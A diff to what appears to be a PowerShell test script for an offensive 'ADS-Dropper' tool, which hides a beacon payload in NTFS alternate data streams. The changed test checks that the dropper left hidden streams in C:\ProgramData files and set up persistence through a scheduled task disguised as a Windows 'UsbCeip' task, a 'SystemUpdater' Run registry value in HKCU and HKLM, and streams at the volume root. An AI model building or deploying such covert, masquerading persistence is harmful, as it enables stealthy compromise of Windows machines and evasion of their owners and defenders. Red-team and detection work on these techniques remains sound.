@@ -69,14 +69,39 @@ function Test-LocalDeployment {
     Write-Host "`n[1/5] Local: $($Persist -join ',') $(if($Encrypt){'[AES]'} else {'[Plain]'})" -ForegroundColor Yellow
     
     & "$scriptPath\src\ADS-Dropper.ps1" -Payload $beaconPayload -Persist $Persist -Encrypt:$Encrypt -Randomize -NoExec
-    $ads = Get-ChildItem $testDir -Recurse -Filter "*:*" | Where-Object Length -gt 0
-    if($ads.Count -eq 0) { throw "No ADS created" }
+    
+    $hostFiles = Get-ChildItem "C:\ProgramData" -Filter "*.dat", "*.log", "*.tmp" -ErrorAction SilentlyContinue
+    $adsFound = $false
+    
+    foreach($file in $hostFiles) {
+        $streams = Get-Item $file.FullName -Stream * -ErrorAction SilentlyContinue | Where-Object Stream -ne ':$DATA'
+        if($streams) {
+            $adsFound = $true
+            break
+        }
+    }
+    
+    if(-not $adsFound) { throw "No ADS created" }
     
     foreach($p in $Persist) {
         switch($p) {
-            'task' { if(!(schtasks /query /tn "*UX*" 2>$null)) { throw "No task" } }
-            'reg'  { if(!(Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\*" 2>$null)) { throw "No reg" } }
-            'volroot' { if(!(Get-ChildItem "C:\:ads_*" 2>$null)) { throw "No volroot" } }
+            'task' { 
+                if(!(schtasks /query /tn "*UX*" 2>$null)) { 
+                    if(!(schtasks /query /tn "*UsbCeip*" 2>$null)) {
+                        throw "No task" 
+                    }
+                } 
+            }
+            'reg'  { 
+                $regFound = (Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -ErrorAction SilentlyContinue).SystemUpdater -or
+                            (Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -ErrorAction SilentlyContinue).SystemUpdater
+                if(-not $regFound) { throw "No reg" }
+            }
+            'volroot' { 
+                if(!(Get-ChildItem "C:\" -Filter ":ads_*" -ErrorAction SilentlyContinue)) { 
+                    throw "No volroot" 
+                }
+            }
         }
     }
     Write-Host "PASS" -ForegroundColor Green
